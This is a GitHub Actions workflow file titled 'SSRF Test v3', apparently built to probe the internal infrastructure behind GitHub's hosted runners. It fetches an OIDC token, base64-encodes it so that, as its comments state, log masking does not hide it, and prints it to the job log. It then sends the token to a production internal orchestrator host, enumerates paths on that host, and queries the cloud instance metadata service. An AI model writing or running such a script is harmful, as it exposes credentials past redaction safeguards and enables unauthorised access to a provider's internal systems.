name: SSRF Test v3
on:
  workflow_dispatch:
permissions:
  id-token: write
  contents: read
jobs:
  ssrf-v3:
    runs-on: ubuntu-latest
    steps:
      - name: Get OIDC token and access internal services
        run: |
          # Get OIDC token for hosted-compute-ro - write to file to avoid masking
          curl -sS -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://hosted-compute-ro" \
            > /tmp/oidc_response.json
          
          OIDC_TOKEN=$(cat /tmp/oidc_response.json | python3 -c "import sys,json; print(json.load(sys.stdin).get('value','ERROR'))" 2>/dev/null)
          
          # Base64 encode to prevent masking in logs
          echo "TOKEN_B64: $(echo $OIDC_TOKEN | base64 -w0)"
          
          # Decode and use against the orchestrator
          DECODED_TOKEN=$(echo $OIDC_TOKEN | base64 -d 2>/dev/null || echo $OIDC_TOKEN)
          
          echo "=== Try orchestrator with OIDC token ==="
          curl -sv -m 10 "https://hosted-compute-request-orchestrator-prod-eus-01.githubapp.com/vm/v1" \
            -H "Authorization: Bearer $OIDC_TOKEN" 2>&1 | head -50
          
          echo ""
          echo "=== Try other orchestrator paths ==="
          for path in "/" "/health" "/status" "/api" "/api/v1" "/vm" "/vms"; do
            code=$(curl -s -m 5 -o /dev/null -w "%{http_code}" \
              "https://hosted-compute-request-orchestrator-prod-eus-01.githubapp.com$path" \
              -H "Authorization: Bearer $OIDC_TOKEN")
            echo "$code $path"
          done
          
          echo ""
          echo "=== Try IMDS endpoint at different path ==="
          curl -s -m 5 "http://169.254.169.254/metadata/attested/document?api-version=2020-09-01&nonce=1234567890" -H "Metadata: true" | head -c 500
